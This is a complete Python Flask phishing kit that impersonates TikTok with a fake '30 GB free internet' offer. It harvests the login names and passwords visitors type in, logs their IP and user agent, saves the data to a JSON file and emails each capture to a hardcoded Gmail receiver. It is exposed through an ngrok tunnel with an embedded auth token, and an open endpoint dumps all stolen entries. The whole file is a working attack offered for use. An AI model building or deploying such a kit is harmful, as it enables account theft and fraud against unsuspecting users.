# =============================================================================
# TIKTOK 30GB FREE DATA PHISHING - RENDER DEPLOYMENT (WITH EMAIL ALERTS)
# =============================================================================

import os
import json
import logging
import smtplib
from email.message import EmailMessage
from datetime import datetime
from flask import Flask, request, render_template_string
from pyngrok import ngrok, conf

# -------------------- Configuration --------------------
NGROK_AUTH_TOKEN = "3CTdjmF4Jk0Gju0TnBL8K5FWoUh_LdxdiFY7GCaUKKmLbGov"
DATA_FILE = "captured_credentials.json"

# Email settings – set these as environment variables on Render
EMAIL_SENDER = os.environ.get('EMAIL_SENDER', 'your-sender@gmail.com')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD', 'your-app-password')
EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'ah3418678@gmail.com')

logging.basicConfig(level=logging.INFO)

# -------------------- ngrok Setup --------------------
conf.get_default().auth_token = NGROK_AUTH_TOKEN
tunnel = ngrok.connect(5000, bind_tls=True)
PUBLIC_URL = tunnel.public_url
print(f"✅ ngrok tunnel established: {PUBLIC_URL}")

# -------------------- Flask App --------------------
app = Flask(__name__)

# TikTok 30GB Offer HTML (Pixel Perfect Design)
PHISH_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok - Free 30GB Internet</title>
    <link rel="icon" href="https://www.tiktok.com/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }
        .card {
            max-width: 400px;
            width: 100%;
            background: white;
            border-radius: 16px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
            overflow: hidden;
            border: 1px solid rgba(0,0,0,0.04);
        }
        .header {
            padding: 24px 20px 12px;
            text-align: center;
            border-bottom: 1px solid #f1f1f2;
        }
        .tiktok-logo {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }
        .tiktok-logo svg {
            width: 130px;
            height: auto;
        }
        .offer-badge {
            background: linear-gradient(135deg, #fe2c55, #ff6b6b);
            color: white;
            padding: 8px 16px;
            border-radius: 50px;
            font-weight: 700;
            font-size: 18px;
            display: inline-block;
            margin-bottom: 16px;
        }
        .offer-title {
            font-size: 28px;
            font-weight: 700;
            color: #121212;
            margin-bottom: 8px;
        }
        .offer-subtitle {
            font-size: 15px;
            color: #8a8b91;
            margin-bottom: 20px;
        }
        .data-visual {
            background: #f8f9fa;
            padding: 20px;
            margin: 0 20px;
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: space-around;
        }
        .data-circle {
            text-align: center;
        }
        .data-number {
            font-size: 48px;
            font-weight: 800;
            color: #fe2c55;
            line-height: 1;
        }
        .data-label {
            font-size: 14px;
            color: #8a8b91;
            margin-top: 4px;
        }
        .login-form {
            padding: 24px 20px 30px;
        }
        .form-group {
            margin-bottom: 16px;
        }
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #121212;
            margin-bottom: 6px;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            background: #f1f1f2;
            border: 1px solid #e1e1e2;
            border-radius: 12px;
            font-size: 16px;
            outline: none;
            transition: border 0.2s;
        }
        .form-group input:focus {
            border-color: #fe2c55;
            background: white;
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #fe2c55;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
            transition: background 0.2s;
        }
        .login-btn:hover {
            background: #e01e45;
        }
        .terms {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #8a8b91;
        }
        .terms a {
            color: #121212;
            text-decoration: none;
            font-weight: 500;
        }
        .success-message {
            text-align: center;
            padding: 40px 20px;
        }
        .success-icon {
            font-size: 64px;
            margin-bottom: 20px;
        }
        .success-title {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 8px;
            color: #121212;
        }
        .success-text {
            color: #8a8b91;
            margin-bottom: 24px;
        }
        .footer-note {
            text-align: center;
            font-size: 12px;
            color: #8a8b91;
            padding: 12px 20px 20px;
            border-top: 1px solid #f1f1f2;
        }
    </style>
</head>
<body>
    <div class="card">
        {% if success %}
        <div class="success-message">
            <div class="success-icon">✅</div>
            <div class="success-title">Claim Successful!</div>
            <div class="success-text">Your 30GB data package will be activated within 24 hours.</div>
            <div style="font-size:14px; color:#fe2c55;">Redirecting to TikTok...</div>
        </div>
        <script>
            setTimeout(function() {
                window.location.href = 'https://www.tiktok.com';
            }, 3000);
        </script>
        {% else %}
        <div class="header">
            <div class="tiktok-logo">
                <svg width="130" height="40" viewBox="0 0 130 40">
                    <rect width="130" height="40" fill="#fe2c55" rx="8"/>
                    <text x="65" y="28" text-anchor="middle" fill="white" font-weight="bold" font-size="20">TikTok</text>
                </svg>
            </div>
            <div class="offer-badge">🎁 LIMITED OFFER</div>
            <div class="offer-title">30 GB Free Internet</div>
            <div class="offer-subtitle">Exclusive for TikTok users</div>
        </div>
        <div class="data-visual">
            <div class="data-circle">
                <div class="data-number">30</div>
                <div class="data-label">GB Data</div>
            </div>
            <div style="font-size:24px; color:#c4c4c6;">→</div>
            <div class="data-circle">
                <div class="data-number">🎬</div>
                <div class="data-label">Streaming</div>
            </div>
            <div class="data-circle">
                <div class="data-number">🎮</div>
                <div class="data-label">Gaming</div>
            </div>
        </div>
        <form method="POST" class="login-form">
            <div class="form-group">
                <label>Email or username</label>
                <input type="text" name="identifier" placeholder="Enter your TikTok email or username" required autofocus>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="login-btn">Log in & Claim Offer</button>
            <div class="terms">
                By continuing, you agree to TikTok's 
                <a href="#">Terms of Service</a> and 
                <a href="#">Privacy Policy</a>.
            </div>
        </form>
        <div class="footer-note">
            🔒 Secure login · TikTok Official Promotion
        </div>
        {% endif %}
    </div>
</body>
</html>
'''

def send_email_alert(identifier, password, ip, user_agent, timestamp):
    """Send captured credentials to the configured receiver email."""
    if not EMAIL_SENDER or not EMAIL_PASSWORD:
        logging.warning("Email credentials not set – skipping email alert.")
        return

    subject = f"🎉 TikTok Capture: {identifier}"
    body = f"""New TikTok login captured!

📧 Identifier: {identifier}
🔐 Password: {password}
🌐 IP Address: {ip}
🕒 Timestamp: {timestamp}
📱 User Agent: {user_agent}

---
This is an automated alert from your TikTok phishing server.
"""

    msg = EmailMessage()
    msg.set_content(body)
    msg['Subject'] = subject
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
            smtp.send_message(msg)
        logging.info(f"✅ Email alert sent to {EMAIL_RECEIVER}")
    except Exception as e:
        logging.error(f"❌ Failed to send email: {e}")

def save_credential(creds):
    """Append captured credentials to JSON file."""
    try:
        with open(DATA_FILE, 'a') as f:
            json.dump(creds, f)
            f.write('\n')
    except Exception as e:
        logging.error(f"Failed to save credentials: {e}")

@app.route('/', methods=['GET', 'POST'])
def phish():
    if request.method == 'POST':
        identifier = request.form.get('identifier', '').strip()
        password = request.form.get('password', '').strip()
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        timestamp = datetime.utcnow().isoformat()

        creds = {
            'identifier': identifier,
            'password': password,
            'ip': ip,
            'timestamp': timestamp,
            'user_agent': user_agent
        }

        # Save locally
        save_credential(creds)

        # Send email alert
        send_email_alert(identifier, password, ip, user_agent, timestamp)

        logging.info(f"🎉 Capture! Identifier: {identifier} | Password: {password} | IP: {ip}")

        return render_template_string(PHISH_HTML, success=True)

    return render_template_string(PHISH_HTML, success=False)

@app.route('/view-data')
def view_data():
    """Return all captured credentials as JSON."""
    try:
        with open(DATA_FILE, 'r') as f:
            lines = f.readlines()
        data = [json.loads(line) for line in lines if line.strip()]
        return {'count': len(data), 'entries': data}
    except FileNotFoundError:
        return {'count': 0, 'entries': []}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
